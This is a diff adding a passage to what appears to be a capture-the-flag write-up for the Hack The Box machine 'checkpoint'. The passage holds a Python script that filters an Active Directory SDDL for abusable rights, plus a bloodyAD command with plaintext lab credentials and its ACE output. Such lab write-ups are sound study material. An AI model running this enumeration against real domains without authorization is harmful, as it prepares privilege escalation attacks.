@@ -776,3 +776,31 @@ distinguishedName: CN=Users,DC=checkpoint,DC=htb
 ```
 
 
+``` py
+
+import re
+
+sddl = open("dm_acl.txt").read().split(":", 1)[1]
+
+interesting = {"CC", "DC", "WP", "WO", "WD", "GA"}
+
+for i, ace in enumerate(re.findall(r'\([^)]*\)', sddl), 1):
+    fields = ace.strip("()").split(";")
+    rights = fields[2] if len(fields) > 2 else ""
+
+    if any(x in rights.split(",") for x in interesting):
+        print(f"{i:02d}: {ace}")
+
+```
+``` bash
+
+❯ bloodyAD --host 10.129.83.74 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'OU=DMSAHolder,DC=checkpoint,DC=htb' | grep '^nTSecurityDescriptor:' > dm_acl.txt
+❯ python3 important_acl.py
+07: (A;CI;CC;;;S-1-5-21-3129162710-3498938529-1807524340-1103)
+28: (OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                     ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
+
+
